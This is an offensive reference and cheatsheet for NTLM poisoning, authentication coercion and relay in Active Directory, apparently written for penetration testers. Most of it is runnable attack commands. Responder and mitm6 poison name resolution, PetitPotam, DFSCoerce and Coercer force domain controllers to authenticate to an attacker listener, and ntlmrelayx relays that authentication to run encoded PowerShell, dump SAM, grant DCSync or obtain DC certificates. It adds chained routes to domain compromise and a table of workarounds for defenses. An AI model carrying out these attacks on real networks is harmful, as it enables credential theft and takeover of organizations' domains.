# NTLM Relay & Authentication Coercion

Deep reference for poisoning, capturing, coercing, and relaying NTLM authentication in Active Directory — still one of the most reliable paths from a low-priv foothold (or even unauthenticated) to domain compromise in 2025-2026. Companion to `ad-enumeration-and-attacks.md`, `adcs-esc-attacks.md` (ESC8/ESC11), and `kerberos-attacks.md`.

> Core rule: NTLM relay **cannot reflect** back to the originating host (patched). You relay machine/user authentication to a *different* target where the relevant signing/EPA protection is off. Capture (offline crack) vs relay (immediate use) are two different goals — choose based on whether you can crack or whether signing is disabled.

---

## 1. Pick Your Targets First

```bash
# Which hosts have SMB signing DISABLED → relayable for SMB:
nxc smb <range> -u '' -p '' --gen-relay-list relay_targets.txt
nxc smb <range> -u user -p pass --gen-relay-list relay_targets.txt
# LDAP relays need: LDAP signing not required AND LDAPS channel binding (EPA) not enforced (default on many DCs).
# AD CS HTTP enrollment (ESC8) needs EPA not enforced on /certsrv.
```

---

## 2. Capture / Poison (passive-ish → offline crack)

### Responder (LLMNR / NBT-NS / mDNS poisoning)
```bash
sudo responder -I eth0                              # default: poisons + serves rogue servers
sudo responder -I eth0 -wv                          # verbose, with WPAD
# Captured NetNTLMv2 → /usr/share/responder/logs/*.txt → crack:
hashcat -m 5600 hash.txt rockyou.txt
```
> When you intend to **relay** (not capture), turn OFF Responder's SMB/HTTP servers so they don't answer first:
> set `SMB = Off` and `HTTP = Off` in `/etc/responder/Responder.conf`.

### mitm6 (IPv6 DNS takeover → relay to LDAP, very high impact)
```bash
sudo mitm6 -d domain.local                          # become the victim's DNS via DHCPv6
# pair with ntlmrelayx → LDAP (below). mitm6 coerces machine auth as boxes renew leases.
```

---

## 3. Coerce (force a specific machine/DC to authenticate to you)

A low-priv domain account (sometimes unauthenticated) can force a target — often a **Domain Controller** — to authenticate outbound to your listener.

```bash
# PetitPotam — MS-EFSR (EfsRpcOpenFileRaw etc.); modern forks include unauth/auth-bypass pipes
python3 PetitPotam.py -u user -p pass <ATTACKER_IP> <DC_IP>
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>                       # try unauth

# PrinterBug / SpoolSample — MS-RPRN (Print Spooler must be up)
python3 dementor.py <ATTACKER_IP> <DC_IP> -u user -p pass -d domain.local
SpoolSample.exe <DC> <ATTACKER_HOST>                              # Windows

# DFSCoerce — MS-DFSNM (works even when Spooler/EFS disabled)
python3 dfscoerce.py -u user -p pass <ATTACKER_IP> <DC_IP>

# ShadowCoerce — MS-FSRVP ;  Coercer = does all of them automatically (17+ methods)
coercer coerce -u user -p pass -t <DC_IP> -l <ATTACKER_IP>
coercer scan  -u user -p pass -t <DC_IP>                          # which methods work

# NetExec built-in
nxc smb <DC_IP> -u user -p pass -M coerce_plus -o LISTENER=<ATTACKER_IP>
```

### Coerce over HTTP (needed for HTTP/LDAP relay targets like ESC8)
SMB coercion gives SMB auth; to relay to HTTP/LDAP you usually need **HTTP** auth from the victim → its **WebClient** (WebDAV) service must be running. Force it on or use a host where it runs:
```bash
# Check/start WebClient remotely
nxc smb <target> -u user -p pass -M webdav            # is WebClient running?
# Drop a .searchConnector-ms / .library-ms on a share the victim opens to auto-start WebClient.
# Then coerce with an HTTP listener (use the @ATTACKER@port / WebDAV UNC form in the coercion tool).
```

---

## 4. Relay (ntlmrelayx targets & actions)

```bash
# --- SMB target: execute / dump SAM (signing must be off) ---
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "powershell -enc <b64>"
impacket-ntlmrelayx -tf relay_targets.txt -smb2support                 # default: dump SAM
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks          # keep sessions in SOCKS

# --- LDAP/LDAPS on a DC ---
impacket-ntlmrelayx -t ldap://<DC_IP>  --dump-laps --dump-adcs --dump-gmsa   # read-only recon
impacket-ntlmrelayx -t ldaps://<DC_IP> --escalate-user lowuser               # grant DCSync to lowuser (if writable)
impacket-ntlmrelayx -t ldap://<DC_IP>  --delegate-access                      # set RBCD from relayed machine acct
impacket-ntlmrelayx -t ldap://<DC_IP>  --shadow-credentials --shadow-target 'dc01$'   # KeyCredentialLink

# --- AD CS (ESC8 HTTP / ESC11 RPC) ---
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
impacket-ntlmrelayx -t rpc://<CA> -rpc-mode ICPR -icpr-ca-name CA_NAME --adcs --template Machine
# → relayed DC$/machine cert; finish with: certipy auth -pfx out.pfx -dc-ip <DC>
```

### Classic high-impact chains
```
mitm6 + ntlmrelayx -t ldaps://DC --delegate-access   → RBCD on a relayed workstation → SYSTEM
PetitPotam(DC) + ntlmrelayx -t http://CA --adcs       → DC$ certificate → DCSync (ESC8)
Responder(off SMB/HTTP) + ntlmrelayx -tf targets -c   → SAM dump / exec on signing-off hosts
DFSCoerce(DC) + ntlmrelayx -t ldap --shadow-credentials --shadow-target dc01$  → DC TGT
```

---

## 5. Defenses You'll See (and how they change the play)

| Control | Effect | Workaround |
|---------|--------|------------|
| SMB signing required | no SMB relay | relay to LDAP/HTTP/RPC instead, or crack the captured hash |
| LDAP signing + channel binding (EPA) | no LDAP relay | target HTTP (ESC8) / RPC (ESC11), or SMB |
| EPA on /certsrv | no ESC8 | ESC11 (RPC), or other ESC |
| LLMNR/NBT-NS disabled | Responder yields less | mitm6 (IPv6), coercion |
| RestrictNTLM / NTLM disabled | no NTLM at all | Kerberos relay (specialized), other vectors |

> 2025 note: Microsoft has been moving to deprecate NTLM and enable signing/EPA by default — but mixed estates keep relay alive. Always test what's actually enforced (nxc shows signing; `--dump-adcs` reveals EPA-less CAs).

---

## 6. Cheatsheet

```bash
# RELAY TARGETS
nxc smb <range> -u u -p p --gen-relay-list targets.txt

# CAPTURE
sudo responder -I eth0 -wv          # (SMB/HTTP off in conf when relaying)
sudo mitm6 -d domain.local

# COERCE
PetitPotam.py -u u -p p <ATK> <DC>
dfscoerce.py  -u u -p p <ATK> <DC>
coercer coerce -u u -p p -t <DC> -l <ATK>
nxc smb <DC> -u u -p p -M coerce_plus

# RELAY
impacket-ntlmrelayx -tf targets.txt -smb2support -c "<cmd>"
impacket-ntlmrelayx -t ldaps://<DC> --delegate-access
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
certipy auth -pfx out.pfx -dc-ip <DC>
```

---

## References

- The Hacker Recipes – NTLM relay — https://www.thehacker.recipes/ad/movement/ntlm/relay
- The Hacker Recipes – Coercion — https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/
- RedTeam-Pentesting – Ultimate Guide to Windows Coercion (2025) — https://blog.redteam-pentesting.de/2025/windows-coercion/
- 0xCZR – NTLM Relay Cheatsheet (2025) — https://www.0xczr.com/tools/NTLM_Relay_Cheatsheet/
- Responder — https://github.com/lgandx/Responder
- mitm6 — https://github.com/dirkjanm/mitm6
- Coercer — https://github.com/p0dalirius/Coercer
- PetitPotam — https://github.com/topotam/PetitPotam ; DFSCoerce — https://github.com/Wh04m1001/DFSCoerce
- dirkjanm – "Relaying credentials everywhere with ntlmrelayx" — https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
